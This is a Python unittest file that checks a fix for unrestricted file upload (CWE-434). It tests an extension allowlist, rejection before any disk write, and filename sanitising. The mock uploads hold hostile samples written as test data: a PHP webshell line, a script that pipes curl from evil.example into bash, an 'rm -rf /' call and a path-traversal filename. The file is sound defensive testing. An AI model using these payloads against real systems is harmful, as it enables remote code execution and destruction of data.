"""
Tests for file_handler.py — verifying CWE-434 remediation (Unrestricted Upload
of File with Dangerous Type).

The fix ensures that:
  1. save_uploaded_file() rejects files whose extension is not in ALLOWED_EXTENSIONS
     before ever calling file.save() on disk.
  2. ALLOWED_EXTENSIONS no longer contains dangerous executable types (php, exe, sh).
  3. Filenames are sanitised with werkzeug's secure_filename before the UUID prefix
     is applied.
"""

import unittest
import sys
import os
import tempfile
import shutil

# Ensure the parent (backend) package is importable
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.file_handler import allowed_file, save_uploaded_file
from config import Config


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

class MockFile:
    """Minimal stand-in for a Werkzeug FileStorage object."""

    def __init__(self, filename, content=b"dummy content"):
        self.filename = filename
        self._content = content
        self.save_called = False
        self.save_path = None

    def save(self, path):
        self.save_called = True
        self.save_path = path
        with open(path, "wb") as fh:
            fh.write(self._content)


# ---------------------------------------------------------------------------
# Tests for allowed_file()
# ---------------------------------------------------------------------------

class TestAllowedFile(unittest.TestCase):
    """Unit tests for the allowed_file() gatekeeper function."""

    # --- safe types that must be permitted ---
    def test_txt_is_allowed(self):
        self.assertTrue(allowed_file("report.txt"))

    def test_pdf_is_allowed(self):
        self.assertTrue(allowed_file("document.pdf"))

    def test_png_is_allowed(self):
        self.assertTrue(allowed_file("image.png"))

    def test_jpg_is_allowed(self):
        self.assertTrue(allowed_file("photo.jpg"))

    def test_jpeg_is_allowed(self):
        self.assertTrue(allowed_file("photo.jpeg"))

    def test_gif_is_allowed(self):
        self.assertTrue(allowed_file("animation.gif"))

    def test_docx_is_allowed(self):
        self.assertTrue(allowed_file("report.docx"))

    def test_xml_is_allowed(self):
        self.assertTrue(allowed_file("data.xml"))

    # --- dangerous types that must be blocked ---
    def test_php_is_blocked(self):
        """PHP scripts must be rejected — removing them from ALLOWED_EXTENSIONS
        is the primary change in config.py."""
        self.assertFalse(allowed_file("webshell.php"))

    def test_exe_is_blocked(self):
        self.assertFalse(allowed_file("malware.exe"))

    def test_sh_is_blocked(self):
        self.assertFalse(allowed_file("backdoor.sh"))

    def test_py_is_blocked(self):
        self.assertFalse(allowed_file("exploit.py"))

    def test_js_is_blocked(self):
        self.assertFalse(allowed_file("payload.js"))

    def test_bat_is_blocked(self):
        self.assertFalse(allowed_file("script.bat"))

    def test_ps1_is_blocked(self):
        self.assertFalse(allowed_file("script.ps1"))

    # --- edge cases ---
    def test_no_extension_is_blocked(self):
        self.assertFalse(allowed_file("noextension"))

    def test_hidden_file_no_ext_is_blocked(self):
        self.assertFalse(allowed_file(".htaccess"))

    def test_double_extension_uses_last_part(self):
        """file.php.pdf → last extension is 'pdf', which is allowed."""
        self.assertTrue(allowed_file("file.php.pdf"))

    def test_case_insensitive_upper(self):
        """Extension check must be case-insensitive."""
        self.assertTrue(allowed_file("IMAGE.PNG"))

    def test_case_insensitive_mixed(self):
        self.assertTrue(allowed_file("document.PDF"))

    def test_php_uppercase_is_blocked(self):
        self.assertFalse(allowed_file("WEBSHELL.PHP"))


# ---------------------------------------------------------------------------
# Tests for save_uploaded_file()
# ---------------------------------------------------------------------------

class TestSaveUploadedFile(unittest.TestCase):
    """Integration-style tests for save_uploaded_file() against a temp folder."""

    def setUp(self):
        # Point UPLOAD_FOLDER to a temporary directory for the duration of each test
        self._orig_upload_folder = Config.UPLOAD_FOLDER
        self._tmpdir = tempfile.mkdtemp()
        Config.UPLOAD_FOLDER = self._tmpdir

    def tearDown(self):
        Config.UPLOAD_FOLDER = self._orig_upload_folder
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    # --- None / empty inputs ---
    def test_returns_error_when_file_is_none(self):
        result, error = save_uploaded_file(None)
        self.assertIsNone(result)
        self.assertIsNotNone(error)

    def test_returns_error_when_filename_is_empty(self):
        mock = MockFile("")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(result)
        self.assertIsNotNone(error)

    # --- dangerous file types must be rejected BEFORE disk write ---
    def test_php_upload_rejected_before_save(self):
        """Core CWE-434 regression: a PHP webshell must never reach file.save()."""
        mock = MockFile("webshell.php", b"<?php system($_GET['cmd']); ?>")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(result, "Expected None result for disallowed file type")
        self.assertIsNotNone(error)
        # Critically: file.save() must not have been called
        self.assertFalse(mock.save_called, "file.save() was invoked for a .php upload — the fix is not working")

    def test_exe_upload_rejected_before_save(self):
        mock = MockFile("malware.exe", b"MZ\x90\x00")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(result)
        self.assertFalse(mock.save_called, "file.save() was invoked for a .exe upload")

    def test_sh_upload_rejected_before_save(self):
        mock = MockFile("backdoor.sh", b"#!/bin/bash\ncurl https://evil.example | bash")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(result)
        self.assertFalse(mock.save_called, "file.save() was invoked for a .sh upload")

    def test_python_script_upload_rejected_before_save(self):
        mock = MockFile("exploit.py", b"import os; os.system('rm -rf /')")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(result)
        self.assertFalse(mock.save_called)

    def test_no_extension_rejected_before_save(self):
        mock = MockFile("noextension")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(result)
        self.assertFalse(mock.save_called)

    # --- allowed file types must succeed ---
    def test_pdf_upload_succeeds(self):
        mock = MockFile("report.pdf", b"%PDF-1.4 dummy")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(error)
        self.assertIsNotNone(result)
        self.assertTrue(mock.save_called)

    def test_txt_upload_succeeds(self):
        mock = MockFile("notes.txt", b"hello world")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(error)
        self.assertIsNotNone(result)

    def test_png_upload_succeeds(self):
        mock = MockFile("image.png", b"\x89PNG\r\n\x1a\n")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(error)
        self.assertIsNotNone(result)

    def test_xml_upload_succeeds(self):
        mock = MockFile("data.xml", b"<?xml version='1.0'?><root/>")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(error)
        self.assertIsNotNone(result)

    # --- result structure for successful upload ---
    def test_result_contains_expected_keys(self):
        mock = MockFile("doc.pdf", b"%PDF-1.4 dummy")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(error)
        for key in ("filename", "original_filename", "file_path", "file_size", "file_type"):
            self.assertIn(key, result, f"Key '{key}' missing from result dict")

    def test_original_filename_preserved_in_result(self):
        mock = MockFile("my_report.pdf", b"%PDF-1.4 dummy")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(error)
        self.assertEqual(result["original_filename"], "my_report.pdf")

    def test_generated_filename_contains_uuid_prefix(self):
        """Saved filename should be prefixed with a UUID for uniqueness."""
        mock = MockFile("report.pdf", b"%PDF-1.4 dummy")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(error)
        # UUID is 36 chars (including hyphens), followed by '_'
        self.assertGreater(len(result["filename"]), 36)
        self.assertIn("_", result["filename"])

    def test_saved_file_exists_on_disk(self):
        mock = MockFile("doc.pdf", b"%PDF-1.4 dummy")
        result, error = save_uploaded_file(mock)
        self.assertIsNone(error)
        self.assertTrue(os.path.exists(result["file_path"]))

    # --- path traversal via filename (secure_filename protection) ---
    def test_path_traversal_in_filename_is_sanitised(self):
        """werkzeug.secure_filename must strip '../' traversal sequences."""
        mock = MockFile("../../../../etc/passwd.txt", b"root:x:0:0:root")
        result, error = save_uploaded_file(mock)
        # Either rejected (empty safe_name) or sanitised to a safe name
        if error is None:
            # If accepted, the saved path must be inside UPLOAD_FOLDER
            self.assertTrue(
                result["file_path"].startswith(Config.UPLOAD_FOLDER),
                "Saved file escaped the upload folder — path traversal not prevented",
            )
        # If rejected, that's also acceptable and secure


# ---------------------------------------------------------------------------
# Tests for ALLOWED_EXTENSIONS configuration
# ---------------------------------------------------------------------------

class TestAllowedExtensionsConfig(unittest.TestCase):
    """Verify the allowlist itself contains no dangerous executable extensions."""

    DANGEROUS_EXTENSIONS = {"php", "exe", "sh", "bat", "ps1", "py", "rb", "pl",
                            "cgi", "asp", "aspx", "jsp", "phtml"}

    def test_no_dangerous_extensions_in_allowlist(self):
        dangerous_found = self.DANGEROUS_EXTENSIONS & Config.ALLOWED_EXTENSIONS
        self.assertEqual(
            dangerous_found,
            set(),
            f"Dangerous extension(s) found in ALLOWED_EXTENSIONS: {dangerous_found}",
        )

    def test_safe_extensions_present(self):
        """Confirm baseline safe types are still allowed after the fix."""
        expected_safe = {"pdf", "txt", "png", "jpg"}
        for ext in expected_safe:
            self.assertIn(ext, Config.ALLOWED_EXTENSIONS,
                          f"Expected safe extension '{ext}' was removed from ALLOWED_EXTENSIONS")


if __name__ == "__main__":
    unittest.main()
